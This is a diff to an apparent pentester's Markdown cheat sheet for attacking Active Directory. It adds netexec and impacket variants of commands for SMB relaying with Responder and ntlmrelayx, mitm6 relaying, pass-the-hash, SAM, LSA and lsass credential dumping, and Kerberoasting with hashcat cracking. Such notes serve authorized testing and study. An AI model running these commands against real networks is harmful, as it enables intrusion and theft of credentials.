@@ -30,16 +30,21 @@ Find out what the domain controller is.
 - The domain controller has SMB-signing enabled by default.
 - `net use`?
 
+Find domain name.
+- `netexec smb [DC-ip]`
+
 Try SMB relaying.
 - Edit and run responder
   - `sudo mousepad /etc/responder/Responder.conf` *(Make sure HTTP & SMB are off)*
   - `sudo responder -I eth0 -dPv` on vpn `sudo responder -I tun0 -dPv`
 - Setup ntlmrelayx
   - `sudo ntlmrelayx.py -tf targets.txt -smb2support --no-wcf-server --no-raw-server --no-winrm-server --no-rpc-server`
+  - `impacket ntlmrelayx -tf targets.txt -smb2support --no-wcf-server --no-raw-server --no-winrm-server --no-rpc-server`
 
 Try MitM6.
 - Setup `ntlmrelayx.py`
-  - `ntlmrelayx.py -6 -t ldaps://[DC-ip] -wh fakewpad.marvel.local -l lootme`
+  - `ntlmrelayx.py -6 -t ldaps://[DC-ip] -wh fakewpad.[domain] -l lootme`
+  - `impacket-ntlmrelayx -6 -t ldaps://[DC-ip] -wh fakewpad.[domain] -l lootme`
 - Launch MitM6
   - `sudo mitm6 -d [domain]`
 
@@ -47,23 +52,24 @@ Try MitM6.
 
 Try Pass the Password & Pass the Hash.
 - Pass the Password
-  - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -d [Domain] -p [password]`
+  - `crackmapexec/netexec smb xxx.xxx.xxx.0/24 -u [user] -d [Domain] -p [password]`
 - Pass the Hash
-  - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth`
+  - `crackmapexec/netexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth`
   - Dump SAM
-    - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --sam`
+    - `crackmapexec/netexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --sam`
   - Enumerate shares
-    - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --shares`
+    - `crackmapexec/netexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --shares`
   - Dump LSA
-    - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --lsa`
+    - `crackmapexec/netexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth --lsa`
   - Dump lsass
-    - `crackmapexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth -M lsassy` *(Can give hashes not in secretsdump)*
+    - `crackmapexec/netexec smb xxx.xxx.xxx.0/24 -u [user] -H [hash] --local-auth -M lsassy` *(Can give hashes not in secretsdump)*
 
 Use `cmedb` to look at all crackmapexec uses and credentials.
 
 Kerberoasting.
 - Dump the hash
   - `sudo python3 /home/kali/.local/bin/GetUserSPNs.py [Domain]/[user]:'[password]' -dc-ip [DC-ip] -request`
+  - `impacket-GetUserSPNs [domain]/[user]:'[password]' -dc-ip [DC-IP] -request`
 - Crack that hash
   - `hashcat -m 13100 [hash file] [wordlist]`
 
